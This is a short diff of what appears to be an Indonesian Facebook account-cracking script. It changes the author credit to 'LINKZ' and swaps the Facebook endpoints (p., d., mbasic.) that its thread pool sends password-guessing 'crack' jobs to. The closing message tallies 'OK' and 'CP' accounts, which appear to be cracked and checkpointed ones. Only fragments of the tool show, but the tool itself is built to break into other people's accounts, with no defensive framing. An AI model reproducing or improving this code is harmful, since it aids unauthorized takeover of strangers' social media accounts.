@@ -2,7 +2,7 @@
 #----[ jangan di oprek, sayangi data hpmu ]-----#
 author = 'Linkz'
 git_hub = 'github.com/Linkz042'
-faceb0ok = 'ROCHMAT BASUKI XD'
+faceb0ok = 'NONE'
 version = 'next blade v.1'
 
 
@@ -34,7 +34,7 @@ def logo():
  |  \| |  _|  \  /  | |    |  _ \| |     / _ \ | | | |  _|
  | |\  | |___ /  \  | |    | |_) | |___ / ___ \| |_| | |___
  |_| \_|_____/_/\_\ |_|    |____/|_____/_/   \_\____/|_____|
- script by {kk}rochmat basuki{P}, version {kk}premium{P} limited user""")
+ script by {kk}LINKZ{P}, version {kk}premium{P} limited user""")
 
 			
 ###---[ USER BARU ]---###
@@ -508,13 +508,13 @@ def manual():
 		for akun in id:
 			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
 			if 'mobile' in metode:
-				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"p.facebook.com",awal)
 			elif 'mbasic' in metode:
 				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 			elif 'free' in metode:
-				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"d.facebook.com",awal)
 			else:
-				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 	sleep(5)
 	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
 
